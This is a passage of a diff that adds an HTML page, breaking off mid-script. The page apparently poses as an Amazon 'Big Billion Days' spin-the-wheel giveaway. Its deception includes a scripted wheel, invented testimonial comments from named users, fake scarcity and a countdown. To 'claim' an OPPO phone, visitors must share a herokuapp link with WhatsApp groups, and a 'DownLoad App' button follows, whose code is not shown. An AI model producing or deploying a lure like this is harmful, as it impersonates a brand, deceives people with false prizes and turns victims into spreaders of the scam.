@@ -1,0 +1,1376 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link id="favicon" rel="shortcut icon" href="https://i.imgur.com/fwQig0O.png">
+    <meta property="og:image" content="https://i.imgur.com/fwQig0O.png">
+    <meta property="og:title" content="🎉Big Billion Days🎉">
+    <meta property="og:description" content="See how lucky you are!">
+    <meta property="og:url" content="https://amazon.com">
+    <title>Big Billion Days</title>
+
+    <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-174943768-7"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'UA-174943768-7');
+    </script>
+
+    <style>
+        #status {
+            color: #F4211A;
+            font-size: 1.0em;
+            font-family: 'minecraftfont';
+
+            height: 100%;
+        }
+
+        .pop {
+            animation: pop 0.58s infinite;
+            -webkit-animation: pop 0.58s infinite;
+        }
+
+        @keyframes pop {
+            from {
+                transform: scale(0.95)
+            }
+
+            50% {
+                transform: scale(1)
+            }
+
+            to {
+                transform: scale(0.95)
+            }
+        }
+
+        @-webkit-keyframes pop {
+            from {
+                -webkit-transform: scale(0.95)
+            }
+
+            50% {
+                -webkit-transform: scale(1)
+            }
+
+            to {
+                -webkit-transform: scale(0.95)
+            }
+        }
+
+        * {
+            margin: 0
+        }
+
+        body {
+            font-family: tahoma, verdana, arial, sans-serif;
+            background-color: #F7F7F7
+        }
+
+        .header {
+            background-color: #4267B2
+        }
+
+        .logo-left {
+            padding: 5px;
+            vertical-align: middle
+        }
+
+        .header-text {
+            font-size: 20px;
+            height: 35px;
+            vertical-align: middle;
+            color: #FFF
+        }
+
+        .spinnerContainer {
+            position: relative;
+            transform: translateX(20%)
+        }
+
+        #clicker,
+        #clicker2 {
+            display: none
+        }
+
+        .clearfix::after,
+        .clearfix::before {
+            content: "";
+            display: table
+        }
+
+        .clearfix::after {
+            clear: both
+        }
+
+        .fbcoms {
+            padding: 0 5px;
+            font-family: Tahoma, Verdana, sans-serif;
+            background-color: #fff;
+            font-size: 12px;
+            text-align: left
+        }
+
+        .comments {
+            font-weight: 700;
+            text-align: center;
+            padding: 0 5px 10px
+        }
+
+        .totlikes {
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 5px 5px 23px;
+            background-repeat: no-repeat;
+            background-position: 5px center
+        }
+
+        .fbblue {
+            color: #3c5a96
+        }
+
+        .buttons {
+            margin-top: 14px;
+            padding: 5px;
+            font-family: Arial, sans-serif;
+            color: #7d7d7f
+        }
+
+        .buttons span {
+            cursor: pointer
+        }
+
+        .buttons span:hover {
+            text-decoration: underline
+        }
+
+        .viewmore {
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 5px 5px 23px;
+            background-position: 5px center;
+            background-repeat: no-repeat
+        }
+
+        .left {
+            cursor: pointer;
+            float: left;
+            color: #3c5a96
+        }
+
+        .left:hover {
+            text-decoration: underline
+        }
+
+        .right {
+            color: #7d7d7f;
+            float: right
+        }
+
+        div,
+        main,
+        article,
+        aside,
+        footer,
+        nav,
+        section,
+        header {
+            display: inline;
+        }
+
+        span {
+            display: block;
+        }
+
+        h1,
+        h2,
+        h3 {
+            display: inline;
+        }
+
+        .item {
+            position: relative;
+            margin-top: 3px;
+            background-color: #eeeff4;
+            padding: 5px 5px 5px 60px;
+            min-height: 60px;
+            box-sizing: border-box
+        }
+
+        .item .profileimg {
+            position: absolute;
+            top: 5px;
+            left: 5px
+        }
+
+        .comtxt {
+            line-height: 16px
+        }
+
+        .name {
+            color: #3c5a96;
+            font-weight: 700
+        }
+
+        .ago {
+            color: #86878c;
+            font-size: .95em
+        }
+
+        .fblike {
+            color: #3c5a96;
+            font-size: .95em;
+            cursor: pointer
+        }
+
+        .fblike:hover {
+            text-decoration: underline
+        }
+
+        .combot {
+            padding-top: 5px
+        }
+
+        .likes {
+            color: #3c5a96;
+            font-size: .95em;
+            cursor: pointer
+        }
+
+        .comments,
+        .hidden .combot,
+        .hidden .comtxt {
+            display: none
+        }
+
+        #fbalert>div {
+            margin-left: 0
+        }
+
+        #fbalert {
+            background-color: #fff;
+            padding: 5px
+        }
+
+        #spinner {
+            position: relative;
+            margin: 1em auto 0;
+            width: 315px;
+            overflow: hidden
+        }
+
+        @media(min-width:360px) {
+            #spinner {
+                width: 340px
+            }
+        }
+
+        #spinBG {
+            z-index: 1;
+            width: 315px
+        }
+
+        @media(min-width:360px) {
+            #spinBG {
+                width: 340px
+            }
+        }
+
+        #spin {
+            z-index: 2;
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            width: 300px
+        }
+
+        @media(min-width:360px) {
+            #spin {
+                width: 325px
+            }
+        }
+
+        #win,
+        #win2,
+        #win3,
+        #winP,
+        #winP1,
+        #winP2 {
+            position: absolute;
+            z-index: 3;
+            width: 65px;
+            left: 126px;
+            top: 120px
+        }
+
+        @media(min-width:360px) {
+
+            #win,
+            #win2,
+            #win3,
+            #winP,
+            #winP1,
+            #winP2 {
+                width: 90px
+            }
+        }
+
+        #win2,
+        #win3,
+        #winP,
+        #winP1,
+        #winP2 {
+            display: none
+        }
+
+        .spinAround {
+            -webkit-animation: spin 6.6s;
+            -moz-animation: spin 6.6s;
+            -o-animation: spin 6.6s;
+            animation: spin 6.6s;
+            -webkit-animation-timing-function: ease;
+            -moz-animation-timing-function: ease;
+            -o-animation-timing-function: ease;
+            animation-timing-function: ease;
+            -webkit-animation-iteration-count: 1;
+            -moz-animation-iteration-count: 1;
+            -o-animation-iteration-count: 1;
+            animation-iteration-count: 1;
+            -webkit-animation-direction: normal;
+            -moz-animation-direction: normal;
+            -o-animation-direction: normal;
+            animation-direction: normal;
+            -webkit-animation-fill-mode: forwards;
+            -moz-animation-fill-mode: forwards;
+            -o-animation-fill-mode: forwards;
+            animation-fill-mode: forwards
+        }
+
+        @-webkit-keyframes spin {
+            0% {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg)
+            }
+
+            90% {
+                -webkit-transform: rotate(3110deg);
+                transform: rotate(3110deg)
+            }
+
+            95% {
+                -webkit-transform: rotate(3108deg);
+                transform: rotate(3108deg)
+            }
+
+            100% {
+                -webkit-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+        }
+
+        @-moz-keyframes spin {
+            0% {
+                -moz-transform: rotate(0deg);
+                transform: rotate(0deg)
+            }
+
+            90% {
+                -moz-transform: rotate(3110deg);
+                transform: rotate(3110deg)
+            }
+
+            95% {
+                -moz-transform: rotate(3108deg);
+                transform: rotate(3108deg)
+            }
+
+            100% {
+                -moz-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+        }
+
+        @-o-keyframes spin {
+            0% {
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg)
+            }
+
+            90% {
+                -o-transform: rotate(3110deg);
+                transform: rotate(3110deg)
+            }
+
+            95% {
+                -o-transform: rotate(3108deg);
+                transform: rotate(3108deg)
+            }
+
+            100% {
+                -o-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                -webkit-transform: rotate(0deg);
+                -moz-transform: rotate(0deg);
+                -o-transform: rotate(0deg);
+                transform: rotate(0deg)
+            }
+
+            90% {
+                -webkit-transform: rotate(3110deg);
+                -moz-transform: rotate(3110deg);
+                -o-transform: rotate(3110deg);
+                transform: rotate(3110deg)
+            }
+
+            95% {
+                -webkit-transform: rotate(3108deg);
+                -moz-transform: rotate(3108deg);
+                -o-transform: rotate(3108deg);
+                transform: rotate(3108deg)
+            }
+
+            100% {
+                -webkit-transform: rotate(3109deg);
+                -moz-transform: rotate(3109deg);
+                -o-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+        }
+
+        .spinAround2 {
+            -webkit-animation: spinTwo 6.6s;
+            -moz-animation: spinTwo 6.6s;
+            -o-animation: spinTwo 6.6s;
+            animation: spinTwo 6.6s;
+            -webkit-animation-timing-function: ease;
+            -moz-animation-timing-function: ease;
+            -o-animation-timing-function: ease;
+            animation-timing-function: ease;
+            -webkit-animation-iteration-count: 1;
+            -moz-animation-iteration-count: 1;
+            -o-animation-iteration-count: 1;
+            animation-iteration-count: 1;
+            -webkit-animation-direction: normal;
+            -moz-animation-direction: normal;
+            -o-animation-direction: normal;
+            animation-direction: normal;
+            -webkit-animation-fill-mode: forwards;
+            -moz-animation-fill-mode: forwards;
+            -o-animation-fill-mode: forwards;
+            animation-fill-mode: forwards
+        }
+
+        @-webkit-keyframes spinTwo {
+            0% {
+                -webkit-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+
+            90% {
+                -webkit-transform: rotate(6314deg);
+                transform: rotate(6314deg)
+            }
+
+            95% {
+                -webkit-transform: rotate(6312deg);
+                transform: rotate(6312deg)
+            }
+
+            100% {
+                -webkit-transform: rotate(6313deg);
+                transform: rotate(6313deg)
+            }
+        }
+
+        @-moz-keyframes spinTwo {
+            0% {
+                -moz-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+
+            90% {
+                -moz-transform: rotate(6314deg);
+                transform: rotate(6314deg)
+            }
+
+            95% {
+                -moz-transform: rotate(6312deg);
+                transform: rotate(6312deg)
+            }
+
+            100% {
+                -moz-transform: rotate(6313deg);
+                transform: rotate(6313deg)
+            }
+        }
+
+        @-o-keyframes spinTwo {
+            0% {
+                -o-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+
+            90% {
+                -o-transform: rotate(6314deg);
+                transform: rotate(6314deg)
+            }
+
+            95% {
+                -o-transform: rotate(6312deg);
+                transform: rotate(6312deg)
+            }
+
+            100% {
+                -o-transform: rotate(6313deg);
+                transform: rotate(6313deg)
+            }
+        }
+
+        @keyframes spinTwo {
+            0% {
+                -webkit-transform: rotate(3109deg);
+                -moz-transform: rotate(3109deg);
+                -o-transform: rotate(3109deg);
+                transform: rotate(3109deg)
+            }
+
+            90% {
+                -webkit-transform: rotate(6314deg);
+                -moz-transform: rotate(6314deg);
+                -o-transform: rotate(6314deg);
+                transform: rotate(6314deg)
+            }
+
+            95% {
+                -webkit-transform: rotate(6312deg);
+                -moz-transform: rotate(6312deg);
+                -o-transform: rotate(6312deg);
+                transform: rotate(6312deg)
+            }
+
+            100% {
+                -webkit-transform: rotate(6313deg);
+                -moz-transform: rotate(6313deg);
+                -o-transform: rotate(6313deg);
+                transform: rotate(6313deg)
+            }
+        }
+
+        ol,
+        ul {
+            list-style: none
+        }
+
+        .clearfix:after {
+            content: " ";
+            display: block;
+            height: 0;
+            clear: both;
+            overflow: hidden;
+            visibility: hidden
+        }
+
+        .clearfix {
+            display: block
+        }
+
+        .wrapper {
+            background-color: #fff;
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+            padding: 7px;
+            width: 96%;
+            margin: 0 auto 14px;
+            border: 1px solid #c4cde1;
+            border-top: 0;
+            max-width: 414px
+        }
+
+        .logo {
+            display: block;
+            margin: 4px auto;
+        }
+
+        .txt {
+            padding: 5px 6px;
+            line-height: 18px;
+            text-align: center
+        }
+
+        .bottom {
+            width: 92%;
+            margin: 20px auto 0;
+            border: 1px solid #ccc;
+            background-color: #f2f2f2;
+            padding: 5px;
+            border-radius: 10px;
+            -moz-border-radius: 10px;
+            -webkit-border-radius: 10px
+        }
+
+        .now {
+            text-align: center;
+            padding-top: 5px
+        }
+
+        #countdown {
+            font-weight: bold;
+        }
+
+        .rules {
+            color: #1b316c;
+            padding: 4px 5px;
+            line-height: 22px
+        }
+
+        a {
+            display: block;
+            background-color: #39579a;
+            border-radius: 7px;
+            -moz-border-radius: 7px;
+            -webkit-border-radius: 7px;
+            padding: 10px 0;
+            text-align: center;
+            font-weight: 700;
+            color: #fff;
+            font-size: 1.6em;
+            border-bottom: 1px solid #1b316c;
+            margin: 7px 13px 5px;
+            text-decoration: none
+        }
+
+        .title {
+            text-align: center;
+            font-weight: 700;
+            font-size: 26px
+        }
+
+        .show-all {
+            display: none;
+        }
+
+        .now2 {
+            padding-top: 10px;
+            font-weight: bold;
+        }
+    </style>
+    <style type="text/css">
+        .form_questions {
+            width: 100%;
+            background-color: #fff
+        }
+
+        .wrapper {
+            max-width: 800px;
+            width: 96%;
+            margin: 0 auto
+        }
+
+        .myButton {
+            background-color: #39579a;
+            border-radius: 4px;
+            border: 2px solid #39579a;
+            display: block;
+            cursor: pointer;
+            color: #ffffff;
+            font-size: 20px;
+            /* font-weight: 200; */
+
+            font-weight: bold;
+            margin: 10px auto;
+            padding: 13px 32px;
+            /* padding: 10px; */
+
+            text-decoration: none;
+            width: 230px;
+        }
+
+
+
+
+        .last_page {
+            display: none;
+        }
+
+        .last-up {
+            text-align: left;
+        }
+
+        .textlastup {
+            color: #068afb;
+            font-size: 18px;
+            padding-bottom: 8px;
+            font-weight: 400;
+        }
+
+        .btn {
+            width: 80%;
+            font-size: 28px;
+            max-width: 345px;
+            margin: 15px auto;
+            background-color: #58BE41;
+            border-radius: 5px;
+            color: #fff;
+            font-weight: 700;
+            text-align: center;
+            display: block;
+            padding: 7px 0;
+            text-decoration: none;
+            -webkit-transition: all 0.2s ease-in-out;
+            -moz-transition: all 0.2s ease-in-out;
+            transition: all 0.2s ease-in-out;
+            box-shadow: none;
+        }
+
+        .btn:hover {
+            background-color: #fff;
+            color: #58BE41;
+            box-shadow: 0 0 2px #58BE41,
+                0 0 5px #58BE41,
+                0 0 7px #58BE41,
+                0 0 11px #58BE41;
+        }
+
+        .btn-share {
+            font-size: 24px;
+            background-color: #58BE41;
+            background-size: 40px auto;
+            background-position: left 5px top 1px;
+            background-repeat: no-repeat;
+        }
+
+        .progress {
+            width: 80%;
+            height: 20px;
+            /* Can be anything */
+            position: relative;
+            margin: 60px 0 20px 0;
+            /* Just for demo spacing */
+            background: #555;
+            padding: 10px;
+            -webkit-box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
+            -moz-box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
+            box-shadow: inset 0 -1px 1px rgba(255, 255, 255, 0.3);
+            margin: auto;
+        }
+
+        .progress>span {
+            display: block;
+            height: 20px;
+            left: 0;
+            top: 0;
+            background-color: #3F51B5;
+            background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0, #00BCD4), color-stop(1, #2196F3));
+            background-image: -moz-linear-gradient(center bottom, rgb(43, 194, 83) 37%, rgb(84, 240, 84) 69%);
+            -webkit-box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
+            -moz-box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
+            box-shadow: inset 0 2px 9px rgba(255, 255, 255, 0.3), inset 0 -2px 6px rgba(0, 0, 0, 0.4);
+            position: absolute;
+            overflow: hidden;
+        }
+
+        .progress>span:after,
+        .animate>span>span {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(.25, rgba(255, 255, 255, .2)), color-stop(.25, transparent), color-stop(.5, transparent), color-stop(.5, rgba(255, 255, 255, .2)), color-stop(.75, rgba(255, 255, 255, .2)), color-stop(.75, transparent), to(transparent));
+            background-image: -moz-linear-gradient(-45deg, rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent);
+            z-index: 1;
+            -webkit-background-size: 50px 50px;
+            -moz-background-size: 50px 50px;
+            -webkit-animation: move 2s linear infinite;
+            -webkit-border-top-right-radius: 8px;
+            -webkit-border-bottom-right-radius: 8px;
+            -moz-border-radius-topright: 8px;
+            -moz-border-radius-bottomright: 8px;
+            border-top-right-radius: 8px;
+            border-bottom-right-radius: 8px;
+            -webkit-border-top-left-radius: 20px;
+            -webkit-border-bottom-left-radius: 20px;
+            -moz-border-radius-topleft: 20px;
+            -moz-border-radius-bottomleft: 20px;
+            border-top-left-radius: 20px;
+            border-bottom-left-radius: 20px;
+            overflow: hidden;
+        }
+
+        .animate>span:after {
+            display: none;
+        }
+
+        @-webkit-keyframes move {
+            0% {
+                background-position: 0 0;
+            }
+
+            100% {
+                background-position: 50px 50px;
+            }
+        }
+
+        .buttond {
+            background-color: #0d609b;
+            color: #fff;
+            font-size: 1.2em;
+            font-weight: bold;
+            text-align: center;
+            padding: 10px;
+            margin-top: 5px;
+        }
+
+
+        .btn-down {
+            font-size: 24px;
+            text-transform: uppercase;
+        }
+    </style>
+    <script type="text/javascript">
+        $(document).ready(function () {
+            var body = document.getElementsByTagName("body")[0];
+            var style = document.createElement("style");
+            style.type = "text/css";
+            style.appendChild(document.createTextNode("div, main, article, aside, footer, nav, section, header {display: block;}span {display: inline;}h1, h2, h3 {display: block;}"));
+            body.appendChild(style);
+        })
+    </script>
+
+</head>
+
+<body onload="spinnerAction()">
+
+    <div class="header">
+        <span class="header-text">Big Billion Days<br> <img src="./images/amazon.png" class="logo-left" height="33"
+                width="70"> Spin The Lucky Wheel!</span>
+    </div>
+
+
+
+    <div class="hide-all">
+        <div id="fbalert">
+            <p> we give our members 1 free spin for a chance to win exclusive prizes!</p>
+
+            <div style="padding-top: 5px; color: #9c9c9c; font-size: 11px;"> </div>
+        </div>
+
+
+        <div id="status" class="pop">
+            <center> </center>
+        </div>
+
+        <div id="spinner">
+            <img id="spinBG" src="./images/spin1.png">
+            <img id="spin" src="./images/spin1.png">
+            <img onclick="startSpin()" id="win" src="./images/innerspin.png">
+            <img onclick="spin2()" id="win2" src="./images/innerspin.png">
+            <img id="winP" src="./images/innerspin.png">
+            <img id="winP2" src="./images/innerspin.png">
+        </div>
+
+        <center>
+            <h6>
+                <font color="red">Only one gift allowed per IP.</font>
+            </h6>
+        </center>
+        <div class="fbcoms">
+
+
+            <p class="comments">Comments:</p>
+            <p class="buttons">
+                <span><svg width="40" style="enable-background:new 0 0 48 48;" version="1.1" viewBox="0 0 48 48"
+                        xml:space="preserve" xmlns="http://www.w3.org/2000/svg"
+                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                        <style type="text/css">
+                            .st0 {
+                                display: none;
+                            }
+
+                            .st1 {
+                                fill: none;
+                                stroke: #303030;
+                                stroke-width: 0.7;
+                                stroke-linecap: round;
+                                stroke-linejoin: round;
+                                stroke-miterlimit: 10;
+                            }
+
+                            .st2 {
+                                fill: #303030;
+                            }
+                        </style>
+                        <g class="st0" id="Padding__x26__Artboard"></g>
+                        <g id="Icons">
+                            <g>
+                                <path class="st1"
+                                    d="M17.95222,33.90544h0.9013c0.21198,0,0.42036,0.06112,0.59631,0.17936    c0.28018,0.18827,0.55758,0.3808,0.84545,0.55725c0.16461,0.1009,0.35297,0.24185,0.53977,0.29492l6.92604,0.00805l4.83793,0.0013    c0.9355,0.00025,1.71305-0.76513,1.69462-1.70044c-0.01669-0.84692-0.15599-1.60765-1.00351-1.60765h0.1076    c0.91396,0,1.61795-0.74711,1.60863-1.66102c-0.00988-0.96905,0.13757-1.76219-0.82805-1.76219h0.3228    c0.92,0,1.40993-0.80351,1.40993-1.73351c0-0.92,0.12016-1.65903-0.79984-1.65903h0.32154c0.92,0,1.04668-0.81019,1.04668-1.73019    c0-0.93-0.49831-1.60727-1.41831-1.60727l-8.70333,0.01419c0.20236-0.27825,1.23094-4.09943,1.15505-4.83301    c-0.0544-0.52583-0.20867-1.0503-0.3366-1.56151c-0.17118-0.68406-0.35542-1.36467-0.53957-2.04532    c-0.11769-0.43504-0.8064-0.7405-1.18842-0.87866c-0.58066-0.21-1.19885-0.11427-1.68509,0.26741    c-0.2588,0.20315-0.66063,0.53764-0.66016,0.88888c0.00162,1.21729-0.00109,2.43457,0.00345,3.65185    c0.00004,0.01062,0.00008,0.02123,0.00012,0.03185c0.00023,0.06161,0.00036,0.12407-0.01541,0.18363    c-0.0169,0.06386-0.05128,0.12147-0.08524,0.17812c-0.68155,1.13686-1.36008,2.27553-2.03821,3.41444    c-0.29735,0.4994-0.59458,0.99887-0.89091,1.49888c-0.26875,0.45347-0.51342,0.94802-0.9745,1.23768    c-0.40725,0.25585-0.7805,0.49207-1.19004,0.74735">
+                                </path>
+                                <path class="st1"
+                                    d="M16.5418,35.94944h-3.68656c-0.7371,0-1.33464-0.59753-1.33464-1.33463V24.34045    c0-0.7371,0.59754-1.33464,1.33464-1.33464h3.68656c0.7371,0,1.33464,0.59754,1.33464,1.33464v10.27436    C17.87644,35.35191,17.2789,35.94944,16.5418,35.94944z">
+                                </path>
+                                <line class="st1" x1="13.55524" x2="13.55524" y1="29.80501" y2="24.76078"></line>
+                                <line class="st1" x1="13.55524" x2="13.55524" y1="30.95262" y2="31.7558"></line>
+                            </g>
+                        </g>
+                    </svg></span><span class="like">Like</span>
+                <span>
+                    <!--?xml version="1.0" ?--><svg width="40" style="enable-background:new 0 0 48 48;" version="1.1"
+                        viewBox="0 0 48 48" xml:space="preserve" xmlns="http://www.w3.org/2000/svg"
+                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                        <style type="text/css">
+                            .st0 {
+                                display: none;
+                            }
+
+                            .st1 {
+                                fill: none;
+                                stroke: #303030;
+                                stroke-width: 0.7;
+                                stroke-linecap: round;
+                                stroke-linejoin: round;
+                                stroke-miterlimit: 10;
+                            }
+
+                            .st2 {
+                                fill: #303030;
+                            }
+                        </style>
+                        <g class="st0" id="Padding__x26__Artboard"></g>
+                        <g id="Icons">
+                            <g>
+                                <path class="st1"
+                                    d="M17.30376,30.96737l-0.68934,1.90643l3.79318-1.78069c0.17639-0.0828,0.36885-0.12573,0.5637-0.12573    h12.98269c0.57547,0,1.0463-0.47084,1.0463-1.0463V16.1725c0-0.57547-0.47084-1.0463-1.0463-1.0463H14.04601    c-0.57786,0-1.0463,0.46845-1.0463,1.0463v13.74857c0,0.57786,0.46844,1.0463,1.0463,1.0463H17.30376z">
+                                </path>
+                                <line class="st1" x1="15.04836" x2="15.04836" y1="26.25386" y2="27.01553"></line>
+                                <line class="st1" x1="15.04836" x2="15.04836" y1="18.17051" y2="24.86477"></line>
+                            </g>
+                        </g>
+                    </svg>
+                </span>
+                <span>Comment</span>
+            </p>
+            <p class="totlikes"><span id="youand"></span><span class="fbblue">12,068 others</span> like this</p>
+            <p class="viewmore clearfix">
+                <span class="left">View more comments</span>
+                <span class="right">15 of 1,356</span>
+            </p>
+
+            <div class="item">
+                <img class="profileimg" src="./images/img1.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Priyanka Kapoor</span> yeahhhhh.. Last week I played and won
+                    OPPO F17 Pro 📱 and guess what?? Today I've received my phone. I am loving it. 💚</p>
+                <p class="combot"><span class="ago">4 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">37</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/img2'.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Prashik Sontakke</span> I got the bagpack.. Thanks Thankssss..
+                    This is the best day ever ⛽️ ..</p>
+                <p class="combot"><span class="ago">13 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">24</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/img3.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Prakash Panwar</span> Amazing game. Just found it. Hope I will
+                    win. EDIT: I got nothing 💔</p>
+                <p class="combot"><span class="ago">29 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">14</span>
+                </p>
+            </div>
+
+            <div class="item">
+                <img class="profileimg" src="./images/img4.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Vicky Arya</span> I don't have many friends on my whatsapp 😢
+                </p>
+                <p class="combot"><span class="ago">35 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">11</span>
+                </p>
+            </div>
+
+            <div class="item">
+                <img class="profileimg" src="./images/img5.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Ajay Rauniyar</span> Anjali, Yes I got my gift from this
+                    website. 💪 </p>
+                <p class="combot"><span class="ago">37 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">9</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/i mg6.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Anjali Kaushal Bedi</span> Has anyone actually won yet? I spun
+                    2 times from both of my accounts but nothing...</p>
+                <p class="combot"><span class="ago">41 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">8</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/img7.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Arnish Bittoo Chaubey</span> Ohhhhh yes I won 🙏 ...</p>
+                <p class="combot"><span class="ago">56 minutes ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">5</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/img8.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Shubhangi Singh</span> I got nothing.. why am I always so
+                    unlucky 😒</p>
+                <p class="combot"><span class="ago">1 hour ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">5</span>
+                </p>
+            </div>
+
+            <div class="item">
+                <img class="profileimg" src="./images/img1110.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Vandana Semwal</span> Why im not winning..? plz help</p>
+                <p class="combot"><span class="ago">1 hour ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">2</span>
+                </p>
+            </div>
+
+            <div class="item">
+                <img class="profileimg" src="./images/img111.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Saathy Basu</span> nice game..</p>
+                <p class="combot"><span class="ago">1 hour ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">1</span>
+                </p>
+            </div>
+
+
+            <div class="item">
+                <img class="profileimg" src="./images/img11.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Nidhi Shah</span> Which courier company will deliver my parcel
+                    🎁 ?</p>
+                <p class="combot"><span class="ago">1 hour ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">1</span>
+                </p>
+            </div>
+            <div class="item">
+                <img class="profileimg" src="./images/img12.jpg" height="50" width="50">
+                <p class="comtxt"><span class="name">Simran Kaur</span> Not fake.. my friend got smartwatch frm this
+                    contest..</p>
+                <p class="combot"><span class="ago">1 hour ago</span>
+                    <span class="fblike">Like</span><span class="likes totlikes">1</span>
+                </p>
+            </div>
+
+
+        </div>
+    </div>
+
+
+
+
+
+    <div class="show-all">
+        <div class="wrapper">
+            <div class="title">
+                <p>Congratulations!</p>
+            </div>
+            <img src="./images/oppoimg.jpg" class="logo" height="214" width="214">
+            <p class="txt">Your have won <b>OPPO F17 Pro (Matte Black, 8GB RAM, 128GB Storage)</b>. We've only 13
+                OPPO F17 Pro left for this week. Follow the instructions below in order to claim your OPPO F17 Pro.
+            </p>
+
+            <p class="now now2">Tell 5 Groups or 20 Friends on WhatsApp about the "Big Billion Days"!</p>
+            <div class="bottom">
+                <div id='lastapp'>
+                    <p class="rules">1. Share with 5 groups / 20 friends on WHATSAPP (click the "WhatsApp" icon
+                        below)</p>
+                    <p class="rules">2. Click "CONTINUE" and claim your OPPO F17 Pro.</p>
+                </div>
+                <div id='buttonl'>
+                    <button class='btn btn-primary' onclick='incrementValue1()' type='button'><a href="whatsapp://send?text=https://big-billion-spin.herokuapp.com/" data-action="share/whatsaap/share" type="button">WhatsApp</a></button>
+                    <input id='number' type='hidden' value='0' />
+
+                    <h4 class='textlastup'>Share until the blue bar is full!</h4>
+
+                    <div class='progress'>
+                        <span aria-valuemax='100%' aria-valuemin='1%' aria-valuenow='1' id='progressbar'
+                            style='width: 1%; max-width: 100%;' />
+                        <p></p>
+                    </div>
+                    <br>
+                    <a href="javascript:tipn();" id="b2">
+                        <div class="buttond"><span style="padding-right: 5px;"
+                                class="glyphicon glyphicon-shopping-cart"></span>CONTINUE
+                        </div>
+                    </a>
+                </div>
+
+            </div>
+
+            <div id='button2' style="display:none">
+
+                <button class='btn btn-primary' onclick='dapp()' type='button'>DownLoad App</button>
+
+            </div>
+
+
+
+
+            <p class="now">This offer is valid for <span id="countdown">500</span> seconds.</p>
+        </div>
+    </div>
+    </div>
+
+    <script type="text/javascript">
+        if (get_Cookie('prog')) {
+            setTimeout(function () {
+                $(".hide-all").hide();
+                $(".show-all").show();
+
+                incrementValue_a();
+                fn1_a();
+
+            }, 200)
+        }
+
+        function spinnerAction() {
+            //alert("Welcome to Lucky Wheel!\n\nSpin the Wheel and you may win exclusive prizes!\n\nClick OK to Start the Game!")
+        }
+
+        function startSpin() {
+            var e = document.getElementById("spin"),
+                n = document.getElementById("win"),
+                t = document.getElementById("winP"),
+                o = document.getElementById("win2");
+            e.className = e.className + "spinAround", n.style.display = "none", t.style.display = "block", setTimeout(function () {
+                t.style.display = "none", o.style.display = "block"
+            }, 150), setTimeout(function () {
+                alert("You Won 1 Free Extra Spin!"), spin2enabled = !0
+            }, 6500)
+        }
+
+        function spin2() {
+            if (spin2enabled) {
+                var e = document.getElementById("spin"),
+                    n = document.getElementById("win"),
+                    t = document.getElementById("winP"),
+                    o = document.getElementById("win2");
+                e.className = e.className + " spinAround2", n.style.display = "none", t.style.display = "block", setTimeout(function () {
